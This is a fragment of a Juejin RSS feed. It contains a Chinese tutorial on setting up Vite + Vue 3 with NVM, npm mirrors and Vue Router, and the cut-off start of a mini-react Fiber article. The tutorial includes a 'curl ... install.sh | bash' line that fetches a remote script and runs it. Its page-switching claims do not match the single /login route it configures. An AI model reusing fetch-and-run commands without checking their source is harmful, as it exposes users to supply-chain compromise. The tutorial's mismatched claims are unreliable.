<p>众行者远。愿这束微光，能照亮我们共同的代码前路。山海自有归期，期待我们下一次更好的相遇~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用 Vite + Vue 3 搭建项目并配置路由的全流程（含国内镜像加速）]]></title>    <link>https://juejin.cn/post/7575090551357128756</link>    <guid>https://juejin.cn/post/7575090551357128756</guid>    <pubDate>2025-11-22T16:08:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575090551357128756" data-draft-id="7574251313884020751" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用 Vite + Vue 3 搭建项目并配置路由的全流程（含国内镜像加速）"/> <meta itemprop="keywords" content="Vue.js,Node.js,Vite"/> <meta itemprop="datePublished" content="2025-11-22T16:08:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AAA阿giao"/> <meta itemprop="url" content="https://juejin.cn/user/473218785740627"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用 Vite + Vue 3 搭建项目并配置路由的全流程（含国内镜像加速）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/473218785740627/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AAA阿giao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T16:08:01.000Z" title="Sat Nov 22 2025 16:08:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>适用于 Windows / macOS / Linux 用户 | 包含 NVM 安装、Node 环境配置、Vite 项目创建、Vue Router 集成</strong></p>
<p>在现代前端开发中，<strong>Vite</strong> 凭借其极速的冷启动和热更新能力，已成为构建 Vue、React 等应用的首选工具。本文将手把手带你从零开始，<strong>使用国内镜像加速</strong>，通过 <strong>NVM 管理 Node.js 版本</strong>，创建一个基于 <strong>Vite + Vue 3</strong> 的项目，并集成 <strong>Vue Router</strong> 实现前端路由功能。</p>
<hr/>
<h2 data-id="heading-0">第一步：安装 NVM（Node Version Manager）</h2>
<p>NVM 是一个用于管理多个 Node.js 版本的工具，特别适合需要在不同项目中切换 Node 版本的开发者。</p>
<h3 data-id="heading-1">Windows 用户</h3>
<p>推荐使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcoreybutler%2Fnvm-windows" title="https://github.com/coreybutler/nvm-windows" target="_blank" ref="nofollow noopener noreferrer">nvm-windows</a>：</p>
<ol>
<li>
<p>卸载已安装的 Node.js（如有）</p>
</li>
<li>
<p>下载安装包：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcoreybutler%2Fnvm-windows%2Freleases" title="https://github.com/coreybutler/nvm-windows/releases" target="_blank" ref="nofollow noopener noreferrer">github.com/coreybutler…</a></p>
</li>
<li>
<p>安装时注意：</p>
<ul>
<li>安装路径不要包含空格（如 <code>C:\nvm</code>）</li>
<li>自动配置环境变量（勾选相关选项）</li>
</ul>
</li>
</ol>
<h3 data-id="heading-2">macOS / Linux 用户</h3>
<p>使用 curl 安装：</p>
<pre><code class="hljs language-bash" lang="bash">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
</code></pre>
<p>然后重启终端或执行：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">source</span> ~/.bashrc  <span class="hljs-comment"># 或 ~/.zshrc</span>
</code></pre>
<hr/>
<h2 data-id="heading-3">第二步：配置国内镜像源（加速下载）</h2>
<p>由于网络原因，从官方源下载 Node.js 和 npm 包可能非常慢。我们可以通过设置镜像地址解决。</p>
<h3 data-id="heading-4">设置 NVM 的 Node 和 npm 镜像（Windows）</h3>
<p>在命令行中执行以下命令（需以管理员身份运行 PowerShell 或 CMD）：</p>
<pre><code class="hljs language-ruby" lang="ruby">nvm npm_mirror <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/npmmirror.com/mirrors</span><span class="hljs-regexp">/npm/</span>
nvm node_mirror <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/npmmirror.com/mirrors</span><span class="hljs-regexp">/node/</span>
</code></pre>
<blockquote>
<p>这两行命令会修改 NVM 的默认下载源为 <strong>淘宝 NPM 镜像（npmmirror.com）</strong> ，大幅提升下载速度。</p>
</blockquote>
<blockquote>
<p>注意：<code>npmmirror.com</code> 是原 <code>npm.taobao.org</code> 的新域名，由阿里云维护。</p>
</blockquote>
<hr/>
<h2 data-id="heading-5">第三步：安装并使用指定版本的 Node.js</h2>
<h3 data-id="heading-6">1. 查看可用的 Node.js 版本</h3>
<pre><code class="hljs language-bash" lang="bash">nvm list available  <span class="hljs-comment"># Windows</span>
nvm ls-remote       <span class="hljs-comment"># macOS / Linux</span>
</code></pre>
<h3 data-id="heading-7">2. 安装推荐版本（如 LTS 版本 v18.18.2）</h3>
<pre><code class="hljs">nvm install 18.18.2
</code></pre>
<blockquote>
<p>推荐使用 <strong>LTS（长期支持）版本</strong>，稳定且兼容性好。</p>
</blockquote>
<h3 data-id="heading-8">3. 切换并使用该版本</h3>
<pre><code class="hljs language-perl" lang="perl">nvm <span class="hljs-keyword">use</span> <span class="hljs-number">18.18</span>.<span class="hljs-number">2</span>
</code></pre>
<p>验证是否生效：</p>
<pre><code class="hljs language-bash" lang="bash">node -v  <span class="hljs-comment"># 应输出 v18.18.2</span>
npm -v   <span class="hljs-comment"># 显示对应 npm 版本</span>
</code></pre>
<hr/>
<h2 data-id="heading-9">第四步：创建 Node.js 全局目录（可选但推荐）</h2>
<p>为避免权限问题和路径混乱，建议手动创建全局模块和缓存目录。</p>
<h3 data-id="heading-10">Windows 示例（以 C 盘为例）</h3>
<pre><code class="hljs language-arduino" lang="arduino">mkdir C:\nodejs\node_global
mkdir C:\nodejs\node_cache
</code></pre>
<p>然后配置 npm：</p>
<pre><code class="hljs language-swift" lang="swift">npm config <span class="hljs-keyword">set</span> <span class="hljs-keyword">prefix</span> <span class="hljs-string">"C:<span class="hljs-subst">\n</span>odejs<span class="hljs-subst">\n</span>ode_global"</span>
npm config <span class="hljs-keyword">set</span> cache <span class="hljs-string">"C:<span class="hljs-subst">\n</span>odejs<span class="hljs-subst">\n</span>ode_cache"</span>
</code></pre>
<h3 data-id="heading-11">将全局目录加入系统 PATH（Windows）</h3>
<ul>
<li>打开“系统属性” → “环境变量”</li>
<li>在 <strong>用户变量</strong> 的 <code>Path</code> 中添加：<code>C:\nodejs\node_global</code></li>
</ul>
<blockquote>
<p>这样你就可以全局使用 <code>vue</code>、<code>vite</code> 等命令了。</p>
</blockquote>
<hr/>
<h2 data-id="heading-12">第五步：配置 .npmrc 文件（提升后续安装速度）</h2>
<p>在用户主目录下（Windows 通常是 <code>C:\Users&lt;你的用户名&gt;</code>）创建或编辑 <code>.npmrc</code> 文件</p>
<p>.npmrc 文件在文章顶部下载</p>
<blockquote>
<p>✅ 此配置确保所有依赖（包括 sass、puppeteer 等）都从国内镜像下载。</p>
</blockquote>
<blockquote>
<p>💡 将此文件复制到 <code>C:\Users&lt;你的用户名&gt;.npmrc</code>（Windows）或 <code>~/.npmrc</code>（macOS/Linux）。</p>
</blockquote>
<hr/>
<h2 data-id="heading-13">第六步：使用 Vite 创建 Vue 3 项目</h2>
<p>现在一切准备就绪，开始创建项目！</p>
<h3 data-id="heading-14">执行创建命令</h3>
<pre><code class="hljs language-sql" lang="sql">npm <span class="hljs-keyword">create</span> vite<span class="hljs-variable">@latest</span> my<span class="hljs-operator">-</span>app <span class="hljs-comment">-- --template vue</span>
</code></pre>
<blockquote>
<p>参数说明：</p>
<ul>
<li><code>my-app</code>：项目文件夹名称</li>
<li><code>--template vue</code>：指定使用 Vue 模板（纯 Vue 3，无 TypeScript、Router 等）</li>
</ul>
</blockquote>
<h3 data-id="heading-15">进入项目并安装依赖</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> my-app
npm install
</code></pre>
<blockquote>
<p>此时会从 <code>registry.npmmirror.com</code> 安装依赖，速度飞快！</p>
</blockquote>
<hr/>
<h2 data-id="heading-16">第七步：启动开发服务器</h2>
<pre><code class="hljs language-arduino" lang="arduino">npm run dev
</code></pre>
<p>你会看到类似输出：</p>
<pre><code class="hljs language-arduino" lang="arduino">  VITE v5<span class="hljs-number">.0</span><span class="hljs-number">.0</span>  ready in <span class="hljs-number">400</span> ms

  ➜  Local:   http:<span class="hljs-comment">//localhost:5173/</span>
  ➜  Network: http:<span class="hljs-comment">//192.168.x.x:5173/</span>
</code></pre>
<p>打开浏览器访问 <code>http://localhost:5173</code>，即可看到 Vue 的欢迎页面。</p>
<hr/>
<h2 data-id="heading-17">第八步：集成 Vue Router（实现页面路由）</h2>
<p>Vite 默认模板不包含路由，我们需要手动安装并配置。</p>
<h3 data-id="heading-18">1. 安装 Vue Router</h3>
<pre><code class="hljs language-css" lang="css">npm install vue-router<span class="hljs-keyword">@4</span>
</code></pre>
<blockquote>
<p>Vue 3 必须使用 <strong>vue-router 4.x</strong></p>
</blockquote>
<h3 data-id="heading-19">2. 创建路由配置文件</h3>
<p>在 <code>src</code> 目录下新建 <code>router/index.js</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 管理路由的文件 </span>
<span class="hljs-comment">// 导入组件</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Login</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../views/user/login.vue'</span>  <span class="hljs-comment">// 登录组件</span>


<span class="hljs-comment">// 导入路由中的方法</span>
<span class="hljs-keyword">import</span> { createRouter, createWebHashHistory } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-comment">// 配置组件和访问路径</span>
<span class="hljs-keyword">const</span> routes = [
    { <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">Login</span> }, <span class="hljs-comment">// /login是登录组件的访问路径，component表示组件的名称</span>

]
<span class="hljs-comment">// 创建路由对象</span>
<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
    <span class="hljs-comment">// 路由的数据</span>
    routes,
    <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHashHistory</span>(), <span class="hljs-comment">// 路由模式，createWebHashHistory表示使用哈希模式</span>
})
<span class="hljs-comment">// 导出路由实例</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router
</code></pre>
<blockquote>
<p>为什么用 <code>createWebHashHistory()</code>？</p>
<ul>
<li>它使用 URL 的 <code>#</code> 部分（如 <code>http://localhost:5173/#/about</code>）</li>
<li>不需要服务器配置，适合静态部署（如 GitHub Pages、Vercel、Netlify）</li>
</ul>
</blockquote>
<h3 data-id="heading-20">3. 在 main.js 中挂载路由</h3>
<p>修改 <code>src/main.js</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./style.css'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-comment">// 导入路由对象</span>
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span>
<span class="hljs-comment">// 创建项目对象</span>
<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
<span class="hljs-comment">// 挂载路由对象</span>
app.<span class="hljs-title function_">use</span>(router)
<span class="hljs-comment">// 挂载组件</span>
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<h3 data-id="heading-21">4. 在 App.vue 中添加导航和路由出口</h3>
<p>修改 <code>src/App.vue</code>：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">RouterView</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">RouterView</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-22">5. 重新运行项目</h3>
<pre><code class="hljs language-arduino" lang="arduino">npm run dev
</code></pre>
<p>现在点击“首页”和“关于”，页面内容会动态切换，说明路由已生效！</p>
<hr/>
<h2 data-id="heading-23">第九步：构建与部署（可选）</h2>
<p>开发完成后，构建生产版本：</p>
<pre><code class="hljs language-arduino" lang="arduino">npm run build
</code></pre>
<p>生成的 <code>dist/</code> 文件夹可直接部署到任何静态服务器（如 Nginx、GitHub Pages、Vercel 等）。</p>
<p>预览构建结果：</p>
<pre><code class="hljs language-arduino" lang="arduino">npm run preview
</code></pre>
<hr/>
<h2 data-id="heading-24">总结：完整流程回顾</h2>













































<table><thead><tr><th>步骤</th><th>操作</th></tr></thead><tbody><tr><td>1</td><td>安装 NVM（多版本 Node 管理）</td></tr><tr><td>2</td><td>配置国内镜像：<code>nvm node_mirror</code> 和 <code>nvm npm_mirror</code></td></tr><tr><td>3</td><td><code>nvm install 18.18.2</code> + <code>nvm use 18.18.2</code></td></tr><tr><td>4</td><td>创建全局目录并配置 PATH</td></tr><tr><td>5</td><td>复制 <code>.npmrc</code> 到用户目录，启用全量镜像</td></tr><tr><td>6</td><td><code>npm create vite@latest my-app -- --template vue</code></td></tr><tr><td>7</td><td><code>npm install</code> + <code>npm run dev</code></td></tr><tr><td>8</td><td>安装 <code>vue-router@4</code>，配置 <code>createWebHashHistory()</code></td></tr><tr><td>9</td><td>修改 <code>main.js</code> 和 <code>App.vue</code>，启用路由</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-25">小贴士</h2>
<ul>
<li>
<p>如果你希望使用 <strong>Vue 官方脚手架（带 Router/Pinia）</strong> ，也可以运行：</p>
<pre><code class="hljs language-sql" lang="sql">npm <span class="hljs-keyword">create</span> vue<span class="hljs-variable">@latest</span>
</code></pre>
<p>它会交互式让你选择是否集成 Router、Pinia、ESLint 等。</p>
</li>
<li>
<p>开发中遇到依赖安装慢？始终检查 <code>.npmrc</code> 是否生效：<code>npm config get registry</code></p>
</li>
<li>
<p>Vite 支持 TypeScript、JSX、CSS 预处理器等，按需扩展即可。</p>
</li>
</ul>
<hr/>
<p>至此，你已经成功搭建了一个<strong>高性能、可路由、国内加速优化</strong>的 Vue 3 项目！接下来就可以自由开发你的应用了。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[mini-react 实现function 组件]]></title>    <link>https://juejin.cn/post/7575104251865956362</link>    <guid>https://juejin.cn/post/7575104251865956362</guid>    <pubDate>2025-11-22T16:47:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575104251865956362" data-draft-id="7575083657994289179" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="mini-react 实现function 组件"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-22T16:47:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Holin_浩霖"/> <meta itemprop="url" content="https://juejin.cn/user/3984285872438743"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            mini-react 实现function 组件
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3984285872438743/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Holin_浩霖
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T16:47:08.000Z" title="Sat Nov 22 2025 16:47:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>代码结构如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/027b9628a3a048f08c14e391a4f886e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSG9saW5f5rWp6ZyW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764434828&amp;x-signature=kGA8ItAe5cKa6X2XtXkuaJGuegU%3D" alt="" loading="lazy"/></p>
<ol>
<li>React.js 作用</li>
</ol>
<ul>
<li><strong>render()</strong> : 渲染入口，初始化根 Fiber 并启动调度</li>
</ul>

<ul>
<li><strong>createElement()</strong> : 将 JSX 转换为虚拟 DOM 对象</li>
</ul>

<ul>
<li><strong>workLoop()</strong> : 调度器，利用 requestIdleCallback 进行时间切片</li>
</ul>

<ul>
<li><strong>performUnitOfWork()</strong> : 处理单个 Fiber 工作单元</li>
</ul>

<ul>
<li><strong>commitRoot()</strong> : 提交阶段入口</li>
</ul>

<pre><code class="hljs language-diff" lang="diff">作用：实现一个非常精简的 Fiber 渲染器的核心逻辑（非完整实现，偏教学/探索用途）。
目标与分层：
<span class="hljs-deletion">- render(): 接收虚拟 DOM（由 JSX 或 createElement 创建），将整体渲染任务拆分为 fiber 工作单元并启动时间切片调度。</span>
<span class="hljs-deletion">- performUnitOfWork(): 在 render 阶段构建/链接 fiber 节点并创建真实 DOM（但不立即挂载到页面上，挂载在 commit 阶段统一处理以优化性能）。</span>
